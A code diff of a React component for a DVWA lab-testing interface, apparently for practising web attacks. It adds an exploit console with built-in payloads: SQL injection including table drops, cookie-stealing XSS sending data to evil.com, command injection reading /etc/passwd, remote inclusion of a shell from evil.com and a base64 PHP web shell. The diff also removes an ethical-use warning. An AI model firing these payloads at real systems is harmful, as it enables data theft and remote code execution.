@@ -1,361 +1,419 @@
 
-import React, { useState } from 'react';
-import { toast } from 'sonner';
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
-import { Button } from '@/components/ui/button';
+import React, { useState, useEffect } from 'react';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
+import { Button } from '@/components/ui/button';
 import { Switch } from '@/components/ui/switch';
-import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
-import { Badge } from '@/components/ui/badge';
-import { Server, Lock, ShieldCheck, AlertTriangle, CheckCircle2, Link2, ExternalLink, ShieldOff } from 'lucide-react';
-
-export interface DVWAConnectionProps {
-  onConnect: (connectionDetails: DVWAConnectionDetails) => void;
-  onDisconnect: () => void;
-  isConnected: boolean;
-  connectionDetails?: DVWAConnectionDetails;
-}
+import { Label } from '@/components/ui/label';
+import { 
+  Select, 
+  SelectContent, 
+  SelectGroup, 
+  SelectItem, 
+  SelectLabel, 
+  SelectTrigger, 
+  SelectValue 
+} from '@/components/ui/select';
+import { PlugIcon, CheckIcon, PlayCircleIcon, PulseIcon, ShieldAlert } from 'lucide-react';
+import { toast } from 'sonner';
 
 export interface DVWAConnectionDetails {
   url: string;
   username: string;
   password: string;
-  securityLevel: 'low' | 'medium' | 'high' | 'impossible';
-  autoLogin: boolean;
+  securityLevel: string;
+  vulnerabilityPath?: string;
+  exploitPayload?: string;
 }
 
+interface DVWAConnectionProps {
+  isConnected: boolean;
+  onConnect: (details: DVWAConnectionDetails) => void;
+  onDisconnect: () => void;
+  connectionDetails?: DVWAConnectionDetails;
+  selectedVulnerability?: string;
+  onVulnerabilitySelect?: (vulnerability: string, path: string) => void;
+  onExploitSubmit?: (payload: string) => void;
+}
+
+// Define available vulnerabilities in DVWA
+const DVWA_VULNERABILITIES = [
+  { 
+    name: 'SQL Injection', 
+    path: '/vulnerabilities/sqli/',
+    payloads: [
+      "' OR '1'='1",
+      "' UNION SELECT user,password FROM users #",
+      "' OR 1=1 #",
+      "admin' --",
+      "'; DROP TABLE users; --"
+    ]
+  },
+  { 
+    name: 'XSS (Reflected)', 
+    path: '/vulnerabilities/xss_r/',
+    payloads: [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "<iframe src='javascript:alert(`XSS`)'>"
+    ]
+  },
+  { 
+    name: 'XSS (Stored)', 
+    path: '/vulnerabilities/xss_s/',
+    payloads: [
+      "<script>alert(document.cookie)</script>",
+      "<img src=x onerror=fetch('https://evil.com?cookie='+document.cookie)>",
+      "<svg/onload=alert('Stored XSS')>"
+    ]
+  },
+  { 
+    name: 'Command Injection', 
+    path: '/vulnerabilities/exec/',
+    payloads: [
+      "127.0.0.1 && cat /etc/passwd",
+      "127.0.0.1 ; cat /etc/passwd",
+      "127.0.0.1 | cat /etc/passwd",
+      "127.0.0.1 || cat /etc/passwd"
+    ]
+  },
+  { 
+    name: 'File Inclusion', 
+    path: '/vulnerabilities/fi/',
+    payloads: [
+      "../../../../../etc/passwd",
+      "http://evil.com/shell.php",
+      "php://filter/convert.base64-encode/resource=index.php",
+      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
+    ]
+  },
+  { 
+    name: 'File Upload', 
+    path: '/vulnerabilities/upload/',
+    payloads: [
+      "shell.php disguised as shell.php.jpg",
+      "shell.php with GIF89a; header",
+      "shell.php with altered MIME type",
+      ".htaccess file to make .jpg execute as PHP"
+    ]
+  },
+  { 
+    name: 'CSRF', 
+    path: '/vulnerabilities/csrf/',
+    payloads: [
+      "<img src='http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change' height='0' width='0' border='0'>",
+      "Form submission from external site",
+      "XHR request with forged session",
+      "Clickjacking with iframe overlay"
+    ]
+  }
+];
+
 export const DVWAConnection: React.FC<DVWAConnectionProps> = ({
+  isConnected,
   onConnect,
   onDisconnect,
-  isConnected,
-  connectionDetails
+  connectionDetails,
+  selectedVulnerability,
+  onVulnerabilitySelect,
+  onExploitSubmit
 }) => {
-  const [url, setUrl] = useState(connectionDetails?.url || 'http://localhost/dvwa');
-  const [username, setUsername] = useState(connectionDetails?.username || 'admin');
-  const [password, setPassword] = useState(connectionDetails?.password || 'password');
-  const [securityLevel, setSecurityLevel] = useState<'low' | 'medium' | 'high' | 'impossible'>(
-    connectionDetails?.securityLevel || 'low'
-  );
-  const [autoLogin, setAutoLogin] = useState(connectionDetails?.autoLogin || false);
-  const [testingConnection, setTestingConnection] = useState(false);
+  const [url, setUrl] = useState('http://localhost/dvwa');
+  const [username, setUsername] = useState('admin');
+  const [password, setPassword] = useState('password');
+  const [securityLevel, setSecurityLevel] = useState('low');
+  const [autoLogin, setAutoLogin] = useState(false);
+  const [connectingState, setConnectingState] = useState(false);
+  const [vulnerabilityType, setVulnerabilityType] = useState('');
+  const [selectedExploit, setSelectedExploit] = useState('');
+  const [customPayload, setCustomPayload] = useState('');
+  const [showExploitConsole, setShowExploitConsole] = useState(false);
+  
+  // Update form if props change
+  useEffect(() => {
+    if (connectionDetails) {
+      setUrl(connectionDetails.url);
+      setUsername(connectionDetails.username);
+      setPassword(connectionDetails.password);
+      setSecurityLevel(connectionDetails.securityLevel);
+    }
+  }, [connectionDetails]);
 
-  const handleTestConnection = () => {
-    if (!url) {
-      toast.error('Please enter a valid URL');
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!url || !username || !password) {
+      toast.error('Please fill all required fields');
       return;
     }
-
-    setTestingConnection(true);
     
-    // Simulate connection test
+    setConnectingState(true);
+    
+    // Simulate connection to DVWA
     setTimeout(() => {
-      toast.success('Successfully connected to DVWA');
-      setTestingConnection(false);
+      const details: DVWAConnectionDetails = {
+        url,
+        username,
+        password,
+        securityLevel,
+        vulnerabilityPath: '',
+        exploitPayload: ''
+      };
+      
+      onConnect(details);
+      setConnectingState(false);
+      toast.success(`Connected to DVWA at ${url}`);
     }, 1500);
   };
-
-  const handleConnect = () => {
-    if (!url) {
-      toast.error('Please enter a valid URL');
+  
+  const handleVulnerabilitySelect = (value: string) => {
+    setVulnerabilityType(value);
+    const selectedVuln = DVWA_VULNERABILITIES.find(v => v.name === value);
+    
+    if (selectedVuln && onVulnerabilitySelect) {
+      onVulnerabilitySelect(value, selectedVuln.path);
+      setShowExploitConsole(true);
+      // Reset exploit selection when vulnerability changes
+      setSelectedExploit('');
+      setCustomPayload('');
+    }
+  };
+  
+  const handleExploitSelect = (value: string) => {
+    setSelectedExploit(value);
+    setCustomPayload(value);
+  };
+  
+  const handleExploitSubmit = () => {
+    if (!customPayload) {
+      toast.error('Please select or enter an exploit payload');
       return;
     }
-
-    const details: DVWAConnectionDetails = {
-      url,
-      username,
-      password,
-      securityLevel,
-      autoLogin
-    };
-
-    onConnect(details);
-    toast.success('Connected to DVWA successfully');
+    
+    if (onExploitSubmit) {
+      onExploitSubmit(customPayload);
+      toast.success('Exploit payload submitted for testing');
+    }
   };
 
-  const handleDisconnect = () => {
-    onDisconnect();
-    toast.info('Disconnected from DVWA');
-  };
-
-  return (
-    <Card className="bg-card/50 backdrop-blur-sm border-red-900/30 shadow-lg shadow-red-500/5">
-      <CardHeader>
-        <CardTitle className="flex items-center">
-          <Server className="mr-2 h-5 w-5 text-red-400" />
-          DVWA Integration
-        </CardTitle>
-        <CardDescription>
-          Connect to Damn Vulnerable Web Application for testing
-        </CardDescription>
-      </CardHeader>
-      <CardContent>
-        {isConnected ? (
-          <div className="space-y-4">
-            <div className="flex items-center space-x-2">
-              <CheckCircle2 className="h-5 w-5 text-green-500" />
-              <span className="text-green-400 font-medium">Connected to DVWA</span>
+  if (isConnected) {
+    return (
+      <Card className="bg-white/5 border-green-900/30 shadow-lg shadow-green-500/5">
+        <CardHeader className="pb-3">
+          <div className="flex justify-between items-center">
+            <div>
+              <CardTitle className="text-xl font-bold flex items-center">
+                <PlugIcon className="mr-2 h-5 w-5 text-green-500" />
+                DVWA Connected
+              </CardTitle>
+              <CardDescription>Target: {connectionDetails?.url}</CardDescription>
             </div>
-            
-            <div className="bg-green-500/10 border border-green-500/20 rounded-md p-3">
-              <div className="space-y-2">
-                <div className="flex justify-between items-center">
-                  <span className="text-sm">URL:</span>
-                  <span className="text-sm font-mono">{connectionDetails?.url}</span>
-                </div>
-                <div className="flex justify-between items-center">
-                  <span className="text-sm">Security Level:</span>
-                  <Badge 
-                    variant="outline" 
-                    className={`
-                      ${connectionDetails?.securityLevel === 'low' ? 'bg-red-500/20 text-red-400 border-red-700/30' : ''}
-                      ${connectionDetails?.securityLevel === 'medium' ? 'bg-orange-500/20 text-orange-400 border-orange-700/30' : ''}
-                      ${connectionDetails?.securityLevel === 'high' ? 'bg-yellow-500/20 text-yellow-400 border-yellow-700/30' : ''}
-                      ${connectionDetails?.securityLevel === 'impossible' ? 'bg-green-500/20 text-green-400 border-green-700/30' : ''}
-                    `}
-                  >
-                    {connectionDetails?.securityLevel.toUpperCase()}
-                  </Badge>
-                </div>
-                <div className="flex justify-between items-center">
-                  <span className="text-sm">Auto Login:</span>
-                  <span className="text-sm">{connectionDetails?.autoLogin ? 'Enabled' : 'Disabled'}</span>
-                </div>
-              </div>
-            </div>
-            
-            <div className="flex justify-between">
-              <Button 
-                variant="outline"
-                size="sm"
-                className="border-red-700/30 hover:border-red-500/50"
-                onClick={handleDisconnect}
-              >
-                <ShieldOff className="mr-2 h-4 w-4" />
-                Disconnect
-              </Button>
-              
-              <a 
-                href={connectionDetails?.url} 
-                target="_blank" 
-                rel="noopener noreferrer"
-              >
-                <Button variant="outline" size="sm">
-                  <ExternalLink className="mr-2 h-4 w-4" />
-                  Open DVWA
-                </Button>
-              </a>
-            </div>
+            <Button 
+              variant="outline" 
+              size="sm" 
+              onClick={onDisconnect}
+              className="border-red-700/30 hover:border-red-500/50 text-red-500"
+            >
+              Disconnect
+            </Button>
           </div>
-        ) : (
-          <div className="space-y-4">
-            <div className="space-y-2">
-              <label htmlFor="dvwa-url" className="text-sm font-medium">DVWA URL</label>
-              <Input
-                id="dvwa-url"
-                value={url}
-                onChange={(e) => setUrl(e.target.value)}
-                placeholder="http://localhost/dvwa"
-                className="bg-background/80 border-white/10"
-              />
-            </div>
-            
-            <div className="grid grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <label htmlFor="dvwa-username" className="text-sm font-medium">Username</label>
-                <Input
-                  id="dvwa-username"
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
-                  placeholder="admin"
-                  className="bg-background/80 border-white/10"
-                />
-              </div>
-              
-              <div className="space-y-2">
-                <label htmlFor="dvwa-password" className="text-sm font-medium">Password</label>
-                <Input
-                  id="dvwa-password"
-                  type="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  placeholder="password"
-                  className="bg-background/80 border-white/10"
-                />
+        </CardHeader>
+        <CardContent className="space-y-4">
+          <div className="grid grid-cols-2 gap-4">
+            <div className="bg-black/30 border border-green-900/30 rounded-md p-3">
+              <div className="text-xs text-green-400 mb-1">Connection Details</div>
+              <div className="text-sm">
+                <div className="flex justify-between">
+                  <span className="text-white/70">Username:</span>
+                  <span className="font-mono">{connectionDetails?.username}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-white/70">Security Level:</span>
+                  <span className="font-mono">{connectionDetails?.securityLevel}</span>
+                </div>
               </div>
             </div>
             
-            <div className="space-y-2">
-              <label htmlFor="security-level" className="text-sm font-medium">Security Level</label>
-              <Select 
-                value={securityLevel} 
-                onValueChange={(value) => setSecurityLevel(value as any)}
-              >
-                <SelectTrigger id="security-level" className="bg-background/80 border-white/10">
-                  <SelectValue placeholder="Select security level" />
+            <div className="bg-black/30 border border-green-900/30 rounded-md p-3">
+              <div className="text-xs text-green-400 mb-1">Select Vulnerability</div>
+              <Select value={vulnerabilityType} onValueChange={handleVulnerabilitySelect}>
+                <SelectTrigger className="w-full bg-black/30 border-green-900/30">
+                  <SelectValue placeholder="Select vulnerability" />
                 </SelectTrigger>
                 <SelectContent>
-                  <SelectItem value="low">
-                    <div className="flex items-center">
-                      <ShieldOff className="h-4 w-4 mr-2 text-red-500" />
-                      <span>Low (Vulnerable)</span>
-                    </div>
-                  </SelectItem>
-                  <SelectItem value="medium">
-                    <div className="flex items-center">
-                      <Shield className="h-4 w-4 mr-2 text-orange-500" />
-                      <span>Medium</span>
-                    </div>
-                  </SelectItem>
-                  <SelectItem value="high">
-                    <div className="flex items-center">
-                      <ShieldCheck className="h-4 w-4 mr-2 text-yellow-500" />
-                      <span>High</span>
-                    </div>
-                  </SelectItem>
-                  <SelectItem value="impossible">
-                    <div className="flex items-center">
-                      <Lock className="h-4 w-4 mr-2 text-green-500" />
-                      <span>Impossible (Secure)</span>
-                    </div>
-                  </SelectItem>
+                  <SelectGroup>
+                    <SelectLabel>Vulnerabilities</SelectLabel>
+                    {DVWA_VULNERABILITIES.map((vuln) => (
+                      <SelectItem key={vuln.name} value={vuln.name}>
+                        {vuln.name}
+                      </SelectItem>
+                    ))}
+                  </SelectGroup>
                 </SelectContent>
               </Select>
             </div>
-            
-            <div className="flex items-center space-x-2 pt-2">
-              <Switch
-                id="auto-login"
-                checked={autoLogin}
-                onCheckedChange={setAutoLogin}
-              />
-              <label htmlFor="auto-login" className="text-sm cursor-pointer">
-                Auto-login when scanning
-              </label>
-            </div>
-            
-            <div className="p-3 bg-black/50 rounded-md border border-red-900/20">
-              <div className="flex">
-                <div className="mr-3">
-                  <AlertTriangle className="h-5 w-5 text-yellow-500" />
-                </div>
-                <div className="text-sm text-gray-300">
-                  <p className="font-medium mb-1">Warning: Ethical Use Only</p>
-                  <p className="text-gray-400 text-xs">
-                    DVWA is designed for security testing in controlled environments. Only connect to DVWA instances you have permission to test.
-                  </p>
-                </div>
-              </div>
-            </div>
           </div>
-        )}
-      </CardContent>
-      <CardFooter>
-        {isConnected ? (
-          <Dialog>
-            <DialogTrigger asChild>
-              <Button 
-                variant="outline" 
-                className="w-full border-red-700/30 hover:border-red-500/50"
-              >
-                <Link2 className="mr-2 h-4 w-4" />
-                Change Security Level
-              </Button>
-            </DialogTrigger>
-            <DialogContent>
-              <DialogHeader>
-                <DialogTitle>Change DVWA Security Level</DialogTitle>
-                <DialogDescription>
-                  Adjust the security level to test different vulnerability scenarios
-                </DialogDescription>
-              </DialogHeader>
-              
-              <div className="space-y-4 py-4">
-                <div className="space-y-2">
-                  <label className="text-sm font-medium">Security Level</label>
-                  <Select 
-                    value={securityLevel} 
-                    onValueChange={(value) => setSecurityLevel(value as any)}
-                  >
-                    <SelectTrigger className="w-full">
-                      <SelectValue placeholder="Select security level" />
-                    </SelectTrigger>
-                    <SelectContent>
-                      <SelectItem value="low">Low (Vulnerable)</SelectItem>
-                      <SelectItem value="medium">Medium</SelectItem>
-                      <SelectItem value="high">High</SelectItem>
-                      <SelectItem value="impossible">Impossible (Secure)</SelectItem>
-                    </SelectContent>
-                  </Select>
+          
+          {/* Exploit Console */}
+          {showExploitConsole && vulnerabilityType && (
+            <div className="bg-black/30 border border-yellow-900/30 rounded-md p-3 space-y-3">
+              <div className="flex items-center justify-between">
+                <div className="text-sm text-yellow-400 flex items-center">
+                  <ShieldAlert className="mr-2 h-4 w-4" />
+                  Exploit Console: {vulnerabilityType}
                 </div>
-                
-                <div className="space-y-2">
-                  <div className="flex items-center space-x-2">
-                    <Switch
-                      id="auto-login-dialog"
-                      checked={autoLogin}
-                      onCheckedChange={setAutoLogin}
-                    />
-                    <label htmlFor="auto-login-dialog" className="text-sm cursor-pointer">
-                      Auto-login when scanning
-                    </label>
-                  </div>
-                </div>
-              </div>
-              
-              <DialogFooter>
                 <Button 
-                  onClick={() => {
-                    handleConnect();
-                    toast.success(`Security level changed to ${securityLevel}`);
-                  }}
+                  variant="ghost" 
+                  size="sm" 
+                  className="h-7 px-2 py-1 text-yellow-400 hover:text-yellow-300 hover:bg-yellow-950/50"
+                  onClick={() => window.open(`${url}${DVWA_VULNERABILITIES.find(v => v.name === vulnerabilityType)?.path}`, '_blank')}
                 >
-                  Apply Changes
+                  <PlayCircleIcon className="mr-1 h-3.5 w-3.5" />
+                  Open in Browser
                 </Button>
-              </DialogFooter>
-            </DialogContent>
-          </Dialog>
-        ) : (
-          <div className="flex w-full gap-2">
-            <Button 
-              variant="outline" 
-              className="flex-1 border-white/10 hover:border-white/20"
-              onClick={handleTestConnection}
-              disabled={testingConnection}
-            >
-              Test Connection
-            </Button>
-            <Button 
-              onClick={handleConnect} 
-              className="flex-1 bg-red-600 hover:bg-red-700"
-              disabled={testingConnection}
-            >
-              Connect to DVWA
-            </Button>
+              </div>
+              
+              <div className="space-y-2">
+                <div className="text-xs text-white/70">Select Exploit Payload:</div>
+                <Select value={selectedExploit} onValueChange={handleExploitSelect}>
+                  <SelectTrigger className="w-full bg-black/30 border-yellow-900/30">
+                    <SelectValue placeholder="Select payload" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectGroup>
+                      <SelectLabel>Payloads</SelectLabel>
+                      {DVWA_VULNERABILITIES.find(v => v.name === vulnerabilityType)?.payloads.map((payload, index) => (
+                        <SelectItem key={index} value={payload}>
+                          {payload.length > 30 ? payload.substring(0, 30) + '...' : payload}
+                        </SelectItem>
+                      ))}
+                    </SelectGroup>
+                  </SelectContent>
+                </Select>
+              </div>
+              
+              <div className="space-y-2">
+                <div className="text-xs text-white/70">Custom Payload:</div>
+                <div className="flex gap-2">
+                  <Input
+                    value={customPayload}
+                    onChange={(e) => setCustomPayload(e.target.value)}
+                    placeholder="Enter payload or modify selected one"
+                    className="font-mono text-sm bg-black/50 border-yellow-900/30"
+                  />
+                  <Button
+                    onClick={handleExploitSubmit}
+                    className="bg-yellow-600 hover:bg-yellow-700 text-white"
+                  >
+                    <PulseIcon className="mr-2 h-4 w-4" />
+                    Execute
+                  </Button>
+                </div>
+              </div>
+            </div>
+          )}
+        </CardContent>
+      </Card>
+    );
+  }
+
+  return (
+    <Card className="bg-white/5 border-purple-900/30 shadow-lg shadow-purple-500/5">
+      <CardHeader className="pb-3">
+        <CardTitle className="text-xl font-bold">
+          DVWA Connection
+        </CardTitle>
+        <CardDescription>
+          Connect to DVWA (Damn Vulnerable Web Application) for testing
+        </CardDescription>
+      </CardHeader>
+      <CardContent>
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <div className="space-y-2">
+            <Label htmlFor="url">DVWA URL</Label>
+            <Input 
+              id="url"
+              placeholder="http://localhost/dvwa"
+              value={url}
+              onChange={(e) => setUrl(e.target.value)}
+              className="bg-white/5 border-white/10"
+            />
           </div>
-        )}
+
+          <div className="grid grid-cols-2 gap-4">
+            <div className="space-y-2">
+              <Label htmlFor="username">Username</Label>
+              <Input 
+                id="username"
+                placeholder="admin"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                className="bg-white/5 border-white/10"
+              />
+            </div>
+
+            <div className="space-y-2">
+              <Label htmlFor="password">Password</Label>
+              <Input 
+                id="password"
+                type="password"
+                placeholder="password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="bg-white/5 border-white/10"
+              />
+            </div>
+          </div>
+
+          <div className="space-y-2">
+            <Label htmlFor="security-level">Security Level</Label>
+            <Select value={securityLevel} onValueChange={setSecurityLevel}>
+              <SelectTrigger className="w-full bg-white/5 border-white/10">
+                <SelectValue placeholder="Select security level" />
+              </SelectTrigger>
+              <SelectContent>
+                <SelectGroup>
+                  <SelectLabel>Security Levels</SelectLabel>
+                  <SelectItem value="low">Low (Vulnerable)</SelectItem>
+                  <SelectItem value="medium">Medium</SelectItem>
+                  <SelectItem value="high">High</SelectItem>
+                  <SelectItem value="impossible">Impossible</SelectItem>
+                </SelectGroup>
+              </SelectContent>
+            </Select>
+          </div>
+
+          <div className="flex items-center space-x-2 pt-2">
+            <Switch
+              id="auto-login"
+              checked={autoLogin}
+              onCheckedChange={setAutoLogin}
+            />
+            <Label htmlFor="auto-login">Auto-login to DVWA</Label>
+          </div>
+        </form>
+      </CardContent>
+      <CardFooter className="border-t border-white/10 pt-4">
+        <Button 
+          type="submit" 
+          onClick={handleSubmit}
+          disabled={connectingState}
+          className="w-full bg-purple-600 hover:bg-purple-700"
+        >
+          {connectingState ? (
+            <>
+              <PulseIcon className="mr-2 h-4 w-4 animate-pulse" />
+              Connecting...
+            </>
+          ) : (
+            <>
+              <PlugIcon className="mr-2 h-4 w-4" />
+              Connect to DVWA
+            </>
+          )}
+        </Button>
       </CardFooter>
     </Card>
-  );
-};
-
-interface ShieldProps {
-  className?: string;
-}
-
-const Shield: React.FC<ShieldProps> = ({ className }) => {
-  return (
-    <svg
-      xmlns="http://www.w3.org/2000/svg"
-      viewBox="0 0 24 24"
-      fill="none"
-      stroke="currentColor"
-      strokeWidth="2"
-      strokeLinecap="round"
-      strokeLinejoin="round"
-      className={className}
-    >
-      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-    </svg>
   );
 };
